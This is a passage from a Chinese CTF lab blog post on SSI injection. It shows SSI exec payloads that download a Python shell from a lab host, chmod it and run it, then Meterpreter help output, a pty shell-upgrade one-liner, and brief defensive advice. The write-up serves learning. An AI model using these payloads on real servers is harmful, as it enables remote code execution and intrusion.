<pre class="language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!--#exec cmd="wget http://10.0.2.4/shell.py"--></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200801175551640.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p>
<p>然后执行语句赋予shell执行权限再进行执行</p>
<pre class="language-html" data-language="html"><code class="language-html">#加权限
<span class="token comment">&lt;!--#exec cmd="chmod 777 shell.py"--></span>
#执行
<span class="token comment">&lt;!--#exec cmd="python shell.py"--></span></code></pre>

<p>然后看到浏览器在不断发送请求，到终端查看监听状况，发现返回了<code>meterpreter</code><br><img src="https://img-blog.csdnimg.cn/20200801175815913.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p>
<p>输入<code>?</code>可以查看当前可执行的命令</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">Core Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    <span class="token function">bg</span>                        Alias <span class="token keyword">for</span> background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    <span class="token builtin class-name">exit</span>                      Terminate the meterpreter session
    get_timeouts              Get the current session <span class="token function">timeout</span> values
    guid                      Get the session GUID
    <span class="token builtin class-name">help</span>                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or <span class="token function">more</span> meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    <span class="token builtin class-name">read</span>                      Reads data from a channel
    resource                  Run the commands stored <span class="token keyword">in</span> a <span class="token function">file</span>
    run                       Executes a meterpreter script or Post module
    secure                    <span class="token punctuation">(</span>Re<span class="token punctuation">)</span>Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session <span class="token function">timeout</span> values
    <span class="token function">sleep</span>                     Force Meterpreter to go quiet, <span class="token keyword">then</span> re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated <span class="token builtin class-name">alias</span> <span class="token keyword">for</span> <span class="token string">"load"</span>
    uuid                      Get the UUID <span class="token keyword">for</span> the current session
    <span class="token function">write</span>                     Writes data to a channel


Stdapi: File system Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

    Command       Description
    -------       -----------
    <span class="token function">cat</span>           Read the contents of a <span class="token function">file</span> to the <span class="token function">screen</span>
    <span class="token builtin class-name">cd</span>            Change directory
    checksum      Retrieve the checksum of a <span class="token function">file</span>
    <span class="token function">chmod</span>         Change the permissions of a <span class="token function">file</span>
    <span class="token function">cp</span>            Copy <span class="token builtin class-name">source</span> to destination
    <span class="token function">dir</span>           List files <span class="token punctuation">(</span>alias <span class="token keyword">for</span> <span class="token function">ls</span><span class="token punctuation">)</span>
    download      Download a <span class="token function">file</span> or directory
    edit          Edit a <span class="token function">file</span>
    getlwd        Print <span class="token builtin class-name">local</span> working directory
    getwd         Print working directory
    lcd           Change <span class="token builtin class-name">local</span> working directory
    lls           List <span class="token builtin class-name">local</span> files
    lpwd          Print <span class="token builtin class-name">local</span> working directory
    <span class="token function">ls</span>            List files
    <span class="token function">mkdir</span>         Make directory
    <span class="token function">mv</span>            Move <span class="token builtin class-name">source</span> to destination
    <span class="token builtin class-name">pwd</span>           Print working directory
    <span class="token function">rm</span>            Delete the specified <span class="token function">file</span>
    <span class="token function">rmdir</span>         Remove directory
    search        Search <span class="token keyword">for</span> files
    upload        Upload a <span class="token function">file</span> or directory


Stdapi: Networking Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Command       Description
    -------       -----------
    <span class="token function">ifconfig</span>      Display interfaces
    ipconfig      Display interfaces
    portfwd       Forward a <span class="token builtin class-name">local</span> port to a remote <span class="token function">service</span>
    resolve       Resolve a <span class="token builtin class-name">set</span> of <span class="token function">host</span> names on the target


Stdapi: System Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Command       Description
    -------       -----------
    execute       Execute a <span class="token builtin class-name">command</span>
    getenv        Get one or <span class="token function">more</span> environment variable values
    getpid        Get the current process identifier
    getuid        Get the user that the server is running as
    <span class="token function">kill</span>          Terminate a process
    localtime     Displays the target system's <span class="token builtin class-name">local</span> <span class="token function">date</span> and <span class="token function">time</span>
    pgrep         Filter processes by name
    <span class="token function">pkill</span>         Terminate processes by name
    <span class="token function">ps</span>            List running processes
    shell         Drop into a system <span class="token builtin class-name">command</span> shell
    sysinfo       Gets information about the remote system, such as OS


Stdapi: Audio Output Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Command       Description
    -------       -----------
    play          play a waveform audio <span class="token function">file</span> <span class="token punctuation">(</span>.wav<span class="token punctuation">)</span> on the target system</code></pre>

<p>输入shell进行利用，再查看id，发现当前登录的只是一个普通用户，而不是root用户<br><img src="https://img-blog.csdnimg.cn/20200801175832732.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p>
<p>终端可以选择进行优化一下，就是让其显示用户名和主机名，和kali的终端形式那样。</p>
<p>python -c ‘import pty;pty.spawn(“/bin/bash”)’</p>
<p>然后就是提权，靶场没有设置flag值，目的是为了学习SSI注入，所以就不再继续进行下去了。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对于SSI漏洞服务器有很多过滤机制，需要进行绕过，比如大小写。</p>
<p>防御措施：</p>
<p>一、进行过滤，过滤这些语法中的特殊字符</p>
<p>二、关闭服务器SSI相关功能</p>
</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me a candy.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://gitee.com/m0re/picture/raw/master/img/wechatpay.jpg"><img loading="lazy" src="https://gitee.com/m0re/picture/raw/master/img/wechatpay.jpg" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>m0re</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://m0re.top/posts/b4cfe3c7/" title="CTF————Web安全SSI注入">https://m0re.top/posts/b4cfe3c7/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/239f0f2a/" rel="prev" title="CTF靶场系列————FTP服务后门利用及SQL注入"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">CTF靶场系列————FTP服务后门利用及SQL注入</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/c853520d/" rel="next" title="CTFhub技能树web &amp; BUU杂项"><span class="post-nav-text">CTFhub技能树web &amp; BUU杂项</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>尝试使用 utterances （基于 GitHub Issues）评论系统。</span><br><span>您可以点击下方按钮切换对应评论系统，</span><br><span><script>function showUtterances(){ document.querySelector(".utterances").style.display='block'; document.querySelector('#valine-container').style.display='none'; }function showValine(){ document.querySelector('#valine-container').style.display='block'; document.querySelector(".utterances").style.display='none'; }</script></span><br><span><a class="hty-button hty-button--raised" onclick="showValine()">Valine</a><a class="hty-button hty-button--raised" onclick="showUtterances()">utterances</a></span><br><span><style>.utterances{display:none;}</style></span><br></div><div id="valine-container"></div><script>Yun.utils.getScript("https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js", () => {
  const valineConfig = {"enable":true,"appId":"gUEA9zKLhCnMFxQI5kI20WiD-gzGzoHsz","appKey":"GQKAp04LNloy3MrDMv86MI3i","placeholder":"评论一下~&nbsp_(:з」∠)_ （填写邮箱可以收到回复通知～）","avatar":null,"pageSize":10,"visitor":true,"highlight":true,"recordIP":true,"enableQQ":true,"requiredFields":["nick","mail"],"el":"#valine-container","lang":"zh-cn"}
  valineConfig.path = "/posts/b4cfe3c7/"
  new Valine(valineConfig)
}, window.Valine);</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">豫ICP备2020025591号-1</a></div><div class="copyright"><span>&copy; 2020 – 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> m0re</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.1.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.6.1</span></div><div class="live_time"><span>本博客已苟延残喘了</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2020-02-21T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
}
blog_live_time();
</script></div><div id="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv" title="总访客量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg></span><span id="busuanzi_value_site_pv"></span></span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#6200ee" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div id="local-search-result"></div></div></div><script src="https://cdn.jsdelivr.net/npm/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>